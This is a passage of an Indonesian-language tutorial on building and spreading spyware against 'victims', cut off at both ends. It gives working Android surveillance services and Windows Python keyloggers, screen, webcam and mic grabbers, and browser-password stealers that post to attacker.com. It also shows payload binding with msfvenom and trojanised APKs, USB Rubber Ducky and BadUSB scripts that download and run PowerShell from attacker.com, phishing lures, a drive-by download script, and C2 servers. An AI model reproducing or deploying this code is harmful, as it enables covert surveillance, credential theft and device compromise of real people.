    android:accessibilityEventTypes="typeViewTextChanged"
    android:accessibilityFlags="flagRequestFilterKeyEvents"
    android:canRetrieveWindowContent="true"
    android:settingsActivity="com.example.spyware.SettingsActivity" />
```

**Cara Aktifkan:**
1. Korban harus **enable Accessibility Service** di:
   `Settings > Accessibility > KeyloggerService`.
2. Spyware akan **merekam semua input** dan simpan di `/sdcard/.keylog.txt`.

---
#### **🔹 Screen Recording & Streaming**
**Keunggulan:**
- **Real-time monitoring** (bukan screenshot berkala).
- **Low bandwidth** (mengirim frame yang berubah saja).

**Contoh Kode (Java - MediaProjection API):**
```java
// ScreenCaptureService.java
package com.example.spyware;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.IBinder;
import android.util.Log;
import android.view.Surface;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int displayWidth;
    private int displayHeight;
    private int displayDensity;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, intent.getParcelableExtra("data"));

        DisplayManager displayManager = (DisplayManager) getSystemService(DISPLAY_SERVICE);
        displayWidth = displayManager.getDisplay(DisplayManager.DISPLAY_PRIMARY).getWidth();
        displayHeight = displayManager.getDisplay(DisplayManager.DISPLAY_PRIMARY).getHeight();
        displayDensity = displayManager.getDisplay(DisplayManager.DISPLAY_PRIMARY).getDensity();

        ImageReader.OnImageAvailableListener imageAvailableListener = new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader reader) {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * displayWidth;

                    // Process image (send to C2)
                    // ...
                    image.close();
                }
            }
        };

        imageReader = ImageReader.newInstance(displayWidth, displayHeight, PixelFormat.RGBA_8888, 2);
        imageReader.setOnImageAvailableListener(imageAvailableListener, null);

        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            displayWidth, displayHeight,
            displayDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface()
        );

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
    }
}
```

**Cara Pakai:**
1. Minta izin **MediaProjection** (memerlukan `Activity` untuk request permission).
2. Start service:
   ```java
   Intent intent = new Intent(this, ScreenCaptureService.class);
   intent.putExtra("data", resultData); // resultData dari onActivityResult
   startService(intent);
   ```

---
#### **🔹 Camera & Microphone Spy**
**Contoh Kode (Java - Camera2 API):**
```java
// CameraService.java
package com.example.spyware;

import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

public class CameraService extends Service {
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private String cameraId;
    private ImageReader imageReader;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            cameraId = cameraManager.getCameraIdList()[0]; // Gunakan kamera belakang
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    createCameraPreview();
                }
                @Override
                public void onDisconnected(CameraDevice camera) {
                    cameraDevice.close();
                }
                @Override
                public void onError(CameraDevice camera, int error) {
                    cameraDevice.close();
                }
            }, null);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }

    private void createCameraPreview() {
        try {
            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = reader.acquireLatestImage();
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);

                        // Save to file
                        File file = new File("/sdcard/.camera_" + System.currentTimeMillis() + ".jpg");
                        try (FileOutputStream fos = new FileOutputStream(file)) {
                            fos.write(bytes);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        image.close();
                    }
                }
            }, null);

            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession session) {
                    try {
                        session.capture(captureBuilder.build(), null, null);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                }
                @Override
                public void onConfigureFailed(CameraCaptureSession session) {}
            }, null);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (cameraDevice != null) {
            cameraDevice.close();
        }
    }
}
```

**AndroidManifest.xml (Tambahan):**
```xml
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-feature android:name="android.hardware.camera" />
<uses-feature android:name="android.hardware.camera.autofocus" />
```

---
#### **🔹 Location Tracking (GPS)**
**Contoh Kode (Java - FusedLocationProvider):**
```java
// LocationService.java
package com.example.spyware;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.Nullable;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

public class LocationService extends Service {
    private FusedLocationProviderClient fusedLocationClient;
    private LocationRequest locationRequest;
    private LocationCallback locationCallback;

    @Override
    public void onCreate() {
        super.onCreate();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        createLocationRequest();
        createLocationCallback();
    }

    private void createLocationRequest() {
        locationRequest = new LocationRequest();
        locationRequest.setInterval(10000); // 10 detik
        locationRequest.setFastestInterval(5000); // 5 detik
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
    }

    private void createLocationCallback() {
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (Location location : locationResult.getLocations()) {
                    // Kirim lokasi ke C2
                    double lat = location.getLatitude();
                    double lon = location.getLongitude();
                    float accuracy = location.getAccuracy();
                    String provider = location.getProvider();
                    String time = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date(location.getTime()));

                    // Simpan ke file atau kirim ke C2
                    // ...
                }
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.myLooper());
        } catch (SecurityException e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        fusedLocationClient.removeLocationUpdates(locationCallback);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
```

**AndroidManifest.xml (Tambahan):**
```xml
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
```

---
#### **🔹 SMS, Call Logs, & WhatsApp Spy**
**Contoh Kode (Java - SMS):**
```java
// SMSService.java
package com.example.spyware;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class SMSService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            Uri uri = Uri.parse("content://sms");
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    int type = cursor.getInt(cursor.getColumnIndex("type"));

                    String typeStr = (type == 1) ? "INBOX" : (type == 2) ? "SENT" : "DRAFT";

                    // Kirim ke C2
                    // ...
                } while (cursor.moveToNext());
                cursor.close();
            }
        }).start();
        return START_STICKY;
    }
}
```

**AndroidManifest.xml (Tambahan):**
```xml
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
```

---
#### **🔹 WhatsApp Spy (Database Extraction)**
**Cara Kerja:**
1. WhatsApp menyimpan database di:
   `/data/data/com.whatsapp/databases/msgstore.db` (terenkripsi).
2. Backup database **tidak terenkripsi** (jika korban tidak aktifkan encryption).
3. Extract database via **ADB** (memerlukan root atau debugging enabled).

**Contoh Kode (Bash - ADB):**
```bash
# Pull database WhatsApp (jika tidak terenkripsi)
adb pull /data/data/com.whatsapp/databases/msgstore.db ~/whatsapp.db

# Jika terenkripsi, coba backup
adb shell "am broadcast -a com.whatsapp.Backup"
sleep 5
adb pull /data/data/com.whatsapp/databases/msgstore.db.crypt12 ~/whatsapp_backup.db

# Decrypt dengan tool (jika punya key)
# Tools: WhatsApp Key DB Extractor
```

**Tools untuk Decrypt:**
- **WhatsApp Key DB Extractor** (memerlukan root).
- **SQLCipher** (untuk decrypt database terenkripsi).

---
#### **🔹 Clipboard & App Usage Monitoring**
**Contoh Kode (Java - Clipboard):**
```java
// ClipboardService.java
package com.example.spyware;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ClipboardService extends Service {
    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener clipListener;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipListener = () -> {
            if (clipboardManager.hasPrimaryClip()) {
                String text = clipboardManager.getPrimaryClip().getItemAt(0).getText().toString();
                // Kirim text ke C2
                // ...
            }
        };
        clipboardManager.addPrimaryClipChangedListener(clipListener);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (clipboardManager != null && clipListener != null) {
            clipboardManager.removePrimaryClipChangedListener(clipListener);
        }
    }
}
```

**AndroidManifest.xml (Tambahan):**
```xml
<uses-permission android:name="android.permission.READ_CLIPBOARD" />
```

---
---
---

### **📌 4.2: Spyware untuk Windows**
---
#### **🔹 Keylogger (Python)**
**File: `keylogger.py`**
```python
import pynput.keyboard
import threading
import requests
from datetime import datetime

class Keylogger:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.log = ""

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f" [{key.name}] "

        # Kirim ke C2 setiap 100 karakter
        if len(self.log) % 100 == 0:
            self.send_to_c2()

    def send_to_c2(self):
        try:
            requests.post(
                self.c2_url,
                data={"log": self.log, "time": str(datetime.now())},
                timeout=5
            )
        except:
            pass

    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    C2_URL = "http://attacker.com/keylog"
    keylogger = Keylogger(C2_URL)
    keylogger.start()
```

**Cara Pakai:**
```bash
# Install dependencies
pip install pynput requests

# Obfuscate (optional)
pyarmor obfuscate keylogger.py

# Build executable
pyinstaller --onefile --windowed keylogger.py
```

---
#### **🔹 Screen Capture & Streaming**
**File: `screen_capture.py`**
```python
import pyautogui
import cv2
import numpy as np
import requests
import time
from io import BytesIO
from PIL import Image

class ScreenStreamer:
    def __init__(self, c2_url, interval=5):
        self.c2_url = c2_url
        self.interval = interval

    def capture_screen(self):
        screenshot = pyautogui.screenshot()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue()

    def send_to_c2(self, image_data):
        try:
            files = {'file': ('screenshot.png', image_data)}
            requests.post(self.c2_url, files=files, timeout=5)
        except:
            pass

    def start(self):
        while True:
            image_data = self.capture_screen()
            self.send_to_c2(image_data)
            time.sleep(self.interval)

if __name__ == "__main__":
    C2_URL = "http://attacker.com/screenshot"
    streamer = ScreenStreamer(C2_URL, interval=10)  # Kirim tiap 10 detik
    streamer.start()
```

---
#### **🔹 Webcam & Microphone Spy**
**File: `webcam_spy.py`**
```python
import cv2
import requests
import time
from io import BytesIO
import sounddevice as sd
import numpy as np

class WebcamSpy:
    def __init__(self, c2_url, interval=30):
        self.c2_url = c2_url
        self.interval = interval

    def capture_webcam(self):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            return img_encoded.tobytes()
        cap.release()
        return None

    def capture_mic(self, duration=5, fs=44100):
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        return recording.tobytes()

    def send_to_c2(self, data, data_type):
        try:
            files = {'file': (f'{data_type}.dat', data)}
            requests.post(self.c2_url, files=files, timeout=5)
        except:
            pass

    def start(self):
        while True:
            # Capture webcam
            webcam_data = self.capture_webcam()
            if webcam_data:
                self.send_to_c2(webcam_data, "webcam")

            # Capture mic
            mic_data = self.capture_mic()
            self.send_to_c2(mic_data, "mic")

            time.sleep(self.interval)

if __name__ == "__main__":
    C2_URL = "http://attacker.com/spy"
    spy = WebcamSpy(C2_URL, interval=60)  # Kirim tiap 60 detik
    spy.start()
```

**Dependencies:**
```bash
pip install opencv-python requests sounddevice numpy
```

---
#### **🔹 Browser History & Password Extraction**
**File: `browser_spy.py`**
```python
import sqlite3
import json
import requests
import os

class BrowserSpy:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.browsers = {
            'chrome': {
                'history': os.path.expanduser('~/.config/google-chrome/Default/History'),
                'cookies': os.path.expanduser('~/.config/google-chrome/Default/Cookies'),
                'passwords': os.path.expanduser('~/.config/google-chrome/Default/Login Data')
            },
            'firefox': {
                'history': os.path.expanduser('~/.mozilla/firefox/*.default/places.sqlite'),
                'cookies': os.path.expanduser('~/.mozilla/firefox/*.default/cookies.sqlite')
            }
        }

    def extract_chrome_history(self):
        try:
            conn = sqlite3.connect(self.browsers['chrome']['history'])
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            return cursor.fetchall()
        except:
            return []

    def extract_chrome_passwords(self):
        try:
            conn = sqlite3.connect(self.browsers['chrome']['passwords'])
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            return cursor.fetchall()
        except:
            return []

    def extract_chrome_cookies(self):
        try:
            conn = sqlite3.connect(self.browsers['chrome']['cookies'])
            cursor = conn.cursor()
            cursor.execute("SELECT host, name, value, path, expires_utc FROM cookies")
            return cursor.fetchall()
        except:
            return []

    def send_to_c2(self, data, data_type):
        try:
            requests.post(
                self.c2_url,
                json={"type": data_type, "data": data},
                timeout=5
            )
        except:
            pass

    def start(self):
        for browser, paths in self.browsers.items():
            if browser == 'chrome':
                history = self.extract_chrome_history()
                passwords = self.extract_chrome_passwords()
                cookies = self.extract_chrome_cookies()

                if history:
                    self.send_to_c2(history, f"{browser}_history")
                if passwords:
                    self.send_to_c2(passwords, f"{browser}_passwords")
                if cookies:
                    self.send_to_c2(cookies, f"{browser}_cookies")

if __name__ == "__main__":
    C2_URL = "http://attacker.com/browser"
    spy = BrowserSpy(C2_URL)
    spy.start()
```

**Catatan:**
- Chrome **mengenkripsi password** dengan **Windows DPAPI** (di Windows) atau **OS Keychain** (di MacOS).
- Gunakan **Mimikatz** (Windows) atau **ChromePass** untuk decrypt.

---
#### **🔹 Process & Network Monitoring**
**File: `system_monitor.py`**
```python
import psutil
import requests
import time
import json

class SystemMonitor:
    def __init__(self, c2_url, interval=60):
        self.c2_url = c2_url
        self.interval = interval

    def get_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
            try:
                processes.append(proc.info)
            except:
                pass
        return processes

    def get_network_connections(self):
        connections = []
        for conn in psutil.net_connections():
            connections.append({
                'fd': conn.fd,
                'family': conn.family,
                'type': conn.type,
                'laddr': conn.laddr,
                'raddr': conn.raddr,
                'status': conn.status,
                'pid': conn.pid
            })
        return connections

    def send_to_c2(self, data, data_type):
        try:
            requests.post(
                self.c2_url,
                json={"type": data_type, "data": data},
                timeout=5
            )
        except:
            pass

    def start(self):
        while True:
            processes = self.get_processes()
            connections = self.get_network_connections()

            self.send_to_c2(processes, "processes")
            self.send_to_c2(connections, "network")

            time.sleep(self.interval)

if __name__ == "__main__":
    C2_URL = "http://attacker.com/monitor"
    monitor = SystemMonitor(C2_URL, interval=30)
    monitor.start()
```

**Dependencies:**
```bash
pip install psutil requests
```

---
---
---

## **🔹 BAB 5: TEKNIK DELIVERY & INSTALASI**

---
---
---

### **📌 Phishing (Email, SMS, WhatsApp)**
---
#### **🔹 Email Phishing dengan Gophish**
Lihat Bab 2.2 untuk setup lengkap.

---
#### **🔹 SMS Phishing dengan TBomb**
**Install TBomb:**
```bash
git clone https://github.com/TheSpeedX/TBomb.git
cd TBomb
pip install -r requirements.txt
```

**Cara Pakai:**
```bash
python3 TBomb.py
```
- Masukkan **nomor target**.
- Pilih **SMS**.
- Kirim **pesan phishing** (contoh: "Undian Berhadiah! Klik link: http://attacker.com/gmail").

---
#### **🔹 WhatsApp Phishing (Social Engineering)**
**Cara:**
1. **Buat halaman phishing** (clone Gmail, Facebook, dll).
2. **Host di server** (ngrok, VPS).
3. **Kirim link** via WhatsApp:
   ```
   Halo, ini link verifikasi akun WhatsApp kamu:
   http://attacker.com/verify?token=ABC123
   ```
4. **Capture credentials** saat korban login.

---
### **📌 File Binding (Gabung File Legit + Payload)**
---
#### **🔹 Bind Payload dengan File Legit (Windows)**
**Tools:**
- **TheFatRat** (auto-bind + obfuscate).
- **msfvenom** (manual bind).

**Cara 1: TheFatRat**
```bash
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
./setup.sh

# Jalankan TheFatRat
./fatrat
# Pilih: [1] Create Backdoor with original .exe
# Masukkan file legit (contoh: setup.exe) + payload
```

**Cara 2: msfvenom**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=IP_VPS LPORT=4444 \
    -x /path/to/legit_setup.exe \
    -k -f exe -o bound_payload.exe
```

---
#### **🔹 Bind Payload dengan APK (Android)**
**Tools:**
- **APKTool** (decompile & recompile).
- **msfvenom** (generate payload).

**Langkah:**
```bash
# 1. Decompile APK legit
apktool d legit_app.apk -o decoded

# 2. Inject smali payload Metasploit
# Copy smali files dari payload.apk (yang di-decode)

# 3. Tambah permission ke AndroidManifest.xml
# <uses-permission android:name="android.permission.INTERNET" />
# <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

# 4. Recompile
apktool b decoded -o infected_app.apk

# 5. Sign APK
keytool -genkey -v -keystore mykey.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore infected_app.apk mykey

# 6. Install ke device
adb install infected_app.apk
```

---
### **📌 USB Drop Attack**
---
#### **🔹 USB Autorun (Windows)**
**File: `autorun.inf`**
```ini
[AutoRun]
open=payload.exe
action=Open folder to view files
shell\open\command=payload.exe
```

**Cara Pakai:**
1. **Format USB**.
2. **Copy `payload.exe` + `autorun.inf`** ke root USB.
3. **Tunggu korban plug USB** → payload auto-execute.

**Catatan:**
- **Autorun hanya bekerja jika:**
  - USB **tidak di-block** oleh Windows (Group Policy).
  - Korban **mengaktifkan AutoRun** (default: disabled di Windows 7+).

---
#### **🔹 USB Rubber Ducky (HID Attack)**
**Hardware:**
- **Digispark ATTiny85** (~$5).
- **USB Rubber Ducky** (~$50).

**Script Ducky (inject keystrokes):**
```ducky
DELAY 3000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

**Cara Pakai:**
1. **Compile script** dengan **DuckEncoder**.
2. **Upload ke Digispark**.
3. **Plug ke USB korban** → payload auto-execute.

---
#### **🔹 BadUSB (Arduino)**
**Contoh Sketch (Arduino Leonardo):**
```cpp
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

---
### **📌 QR Code Phishing (Quishing)**
**Cara:**
1. **Buat QR code** yang redirect ke halaman phishing.
2. **Tempel QR code** di tempat umum (kafe, kampus, dll).
3. **Korban scan → auto-download payload**.

**Contoh Script (Python):**
```python
import qrcode

# Bikin QR code ke download payload
url = "http://attacker.com/payload.apk"
qr = qrcode.make(url)
qr.save("qr_code.png")

print("[+] QR code dibuat: qr_code.png")
print("[+] Print dan tempel di tempat umum")
```

---
### **📌 Drive-by Download**
**Konsep:** Korban **mengunjungi website** → payload **auto-download & execute**.

**Cara:**
1. **Clone website populer** (contoh: Google, YouTube).
2. **Inject JavaScript** untuk auto-download:
   ```html
   <script>
   window.onload = function() {
       var link = document.createElement('a');
       link.href = '/payload.exe';
       link.download = 'update.exe';
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);

       // Redirect ke halaman asli
       setTimeout(function() {
           window.location.href = 'https://google.com';
       }, 3000);
   };
   </script>
   ```
3. **Host website** (ngrok, VPS).
4. **Korban kunjungi → payload terdownload otomatis**.

---
### **📌 Social Engineering (Pretexting)**
**Teknik:**
- **Pura-pura IT Support** → "Kami mendeteksi virus di komputer Anda."
- **Pura-pura Rekan Kerja** → "Bantu aku download file ini ya."
- **Pura-pura Vendor** → "Update software terbaru untuk perangkat Anda."

**Contoh Script (Phishing Email):**
```html
Subject: 🔒 Urgent: Security Update Required

Dear User,

We detected a critical vulnerability in your system.
To prevent data loss, please install the security patch immediately:

👉 Download Patch: http://attacker.com/security_patch.exe

Failure to install this update may result in permanent data loss.

IT Support Team
```

---
---
---

## **🔹 BAB 6: COMMAND & CONTROL (C2)**

---
---
---

### **📌 C2 Server (Python - WebSocket)**
**Keunggulan:**
- **Real-time communication** (bukan HTTP polling).
- **Persistent connection** (tidak putus-putus).
- **Bypass firewall** (WebSocket sering diizinkan).

**File: `c2_websocket_server.py`**
```python
#!/usr/bin/env python3
import asyncio
import websockets
import json
import sqlite3
import datetime
import base64
import os
from aiohttp import web

# Database setup
db = sqlite3.connect('c2.db', check_same_thread=False)
cursor = db.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        ip TEXT,
        hostname TEXT,
        os TEXT,
        user TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT
    )
""")
db.commit()

connected = {}  # {websocket: victim_id}

async def handle_client(websocket, path):
    victim_id = None
    try:
        # Terima info client
        data = await websocket.recv()
        try:
            data = json.loads(data)
        except:
            pass

        if 'type' in data and data['type'] == 'register':
            victim_id = data.get('id')
            connected[websocket] = victim_id

            cursor.execute("""
                INSERT OR REPLACE INTO victims
                (id, ip, hostname, os, user, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                victim_id,
                data.get('ip'),
                data.get('hostname'),
                data.get('os'),
                data.get('user'),
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat(),
                'online'
            ))
            db.commit()
            print(f"[+] Korban connect: {victim_id}")

        async for message in websocket:
            try:
                data = json.loads(message)
                msg_type = data.get('type')

                if msg_type == 'heartbeat':
                    cursor.execute("UPDATE victims SET last_seen=?, status='online' WHERE id=?", (
                        datetime.datetime.now().isoformat(), victim_id
                    ))
                    db.commit()

                elif msg_type == 'command_result':
                    print(f"[{victim_id}] {data.get('command')}\n{data.get('output')}")

                elif msg_type == 'file_upload':
                    file_data = base64.b64decode(data.get('file_data'))
                    file_path = f"uploads/{victim_id}_{data.get('file_name')}"
                    os.makedirs('uploads', exist_ok=True)
                    with open(file_path, 'wb') as f:
                        f.write(file_data)
                    print(f"[+] File uploaded: {file_path}")

                elif msg_type == 'screenshot':
                    img_data = base64.b64decode(data.get('image_data'))
                    img_path = f"screenshots/{victim_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    os.makedirs('screenshots', exist_ok=True)
                    with open(img_path, 'wb') as f:
                        f.write(img_data)
                    print(f"[+] Screenshot saved: {img_path}")

            except:
                continue

    except websockets.exceptions.ConnectionClosed:
        if victim_id and victim_id in connected.values():
            cursor.execute("UPDATE victims SET status='offline' WHERE id=?", (victim_id,))
            db.commit()
            print(f"[-] Korban disconnect: {victim_id}")
            if websocket in connected:
                del connected[websocket]

# Web panel (aiohttp)
async def web_panel(request):
    cursor.execute("SELECT * FROM victims ORDER BY last_seen DESC")
    victims = cursor.fetchall()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Panel</title>
        <style>
            body { font-family: Arial; margin: 20px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            .online { color: green; }
            .offline { color: red; }
        </style>
    </head>
    <body>
        <h1>C2 Panel - Victims</h1>
        <table>
            <tr>
                <th>ID</th>
                <th>IP</th>
                <th>Hostname</th>
                <th>OS</th>
                <th>User</th>
                <th>Status</th>
                <th>Last Seen</th>
            </tr>
    """

    for victim in victims:
        status_class = 'online' if victim[7] == 'online' else 'offline'
        html += f"""
        <tr>
            <td>{victim[0]}</td>
            <td>{victim[1]}</td>
            <td>{victim[2]}</td>
            <td>{victim[3]}</td>
            <td>{victim[4]}</td>
            <td class="{status_class}">{victim[7]}</td>
            <td>{victim[6]}</td>
        </tr>
        """

    html += """
        </table>
    </body>
    </html>
    """
    return web.Response(text=html, content_type='text/html')

app = web.Application()
app.router.add_get('/', web_panel)

async def start_server():
    # Start WebSocket server
    await websockets.serve(handle_client, "0.0.0.0", 8080)
    # Start web panel
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8000)
    await site.start()

    print("=" * 50)
    print("  C2 Server - WebSocket: 8080 | Web Panel: 8000")
    print("=" * 50)

    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(start_server())
```

**Cara Jalankan:**
```bash
pip3 install websockets aiohttp
python3 c2_websocket_server.py
```

**Akses Web Panel:**
```
http://IP_VPS:8000
```

---
### **📌 C2 Server (PHP + MySQL)**
**Keunggulan:**
- **Mudah di-deploy** (shared hosting mendukung PHP).
- **Database terintegrasi** (MySQL).
- **Web-based panel**.

**File: `c2_server.php`**
```php
<?php
// Database connection
$db = new mysqli('localhost', 'user', 'password', 'c2_db');
if ($db->connect_error) {
    die("Connection failed: " . $db->connect_error);
}

// Create victims table
$db->query("
    CREATE TABLE IF NOT EXISTS victims (
        id VARCHAR(255) PRIMARY KEY,
        ip VARCHAR(255),
        hostname VARCHAR(255),
        os VARCHAR(255),
        user VARCHAR(255),
        first_seen DATETIME,
        last_seen DATETIME,
        status ENUM('online', 'offline')
    )
");

// Handle WebSocket-like requests (via long polling)
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $victim_id = $_GET['id'] ?? '';

    if ($action == 'register') {
        $ip = $_SERVER['REMOTE_ADDR'];
        $hostname = $_POST['hostname'] ?? '';
        $os = $_POST['os'] ?? '';
        $user = $_POST['user'] ?? '';

        $db->query("
            INSERT INTO victims (id, ip, hostname, os, user, first_seen, last_seen, status)
            VALUES ('$victim_id', '$ip', '$hostname', '$os', '$user', NOW(), NOW(), 'online')
            ON DUPLICATE KEY UPDATE
                ip = '$ip',
                hostname = '$hostname',
                os = '$os',
                user = '$user',
                last_seen = NOW(),
                status = 'online'
        ");
        echo "OK";
    }
    elseif ($action == 'command') {
        $command = $_POST['command'] ?? '';
        $result = shell_exec($command);
        echo $result;
    }
    elseif ($action == 'heartbeat') {
        $db->query("UPDATE victims SET last_seen = NOW() WHERE id = '$victim_id'");
        echo "OK";
    }
    exit;
}

// Web Panel
echo "<!DOCTYPE html>
<html>
<head>
    <title>C2 Panel</title>
